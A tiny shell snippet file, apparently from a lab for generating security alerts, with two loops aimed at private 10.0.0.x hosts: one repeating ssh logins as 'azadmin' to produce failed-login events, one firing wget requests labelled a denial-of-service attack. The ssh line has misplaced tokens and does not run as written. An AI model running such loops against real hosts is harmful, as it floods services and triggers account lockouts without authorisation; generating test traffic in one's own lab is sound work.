# to generate a loop for ssh failed logins
a=0; while [ $a != 1000 ]; do ssh azadmin@10.0.0.5 ; ssh azadmin@10.0.0.6 ssh ; azadmin@10.0.0.7 ; echo $a $(( a++ )); done

# to generate a denial of services attack with http request using wget
a=0; while [ $a != 1000 ]; do wget  10.0.0.5 -P /dev/null ; wget 10.0.0.6 -P /dev/null ; wget 10.0.0.7 -P /dev/null ; echo $a $(( a++ )); done